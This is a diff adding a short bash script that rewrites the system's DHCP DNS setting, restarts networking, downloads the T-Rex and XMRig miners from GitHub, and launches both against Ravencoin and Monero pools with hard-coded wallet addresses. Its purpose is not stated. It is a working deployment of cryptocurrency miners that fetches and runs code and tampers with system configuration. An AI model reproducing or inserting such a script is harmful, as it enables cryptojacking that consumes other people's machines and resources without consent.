@@ -1,0 +1,8 @@
+#!/bin/bash
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
+tar -xvf t-rex-0.24.8-linux.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar xvf xmrig-6.18.0-linux-x64.tar.gz
+./t-rex -a kawpow -o stratum+ssl://stratum-ravencoin.flypool.org:3443 -u RHa5RFQKcnCqyHCMn3F7XjpGDYXYXAASVw.1 -p x & ./xmrig-6.18.0/xmrig --api-worker-id test -o xmr-us-east1.nanopool.org:14433 -u 468QQwWvgNtUKaeq4UPLgHfJ8H831nxNDDnUM5qHc1PgeX7HikgL3gcKA4cNrWTwkDM9zXxzhKztjZFmiUVzFeui4VgWQpX.2 --tls --coin monero
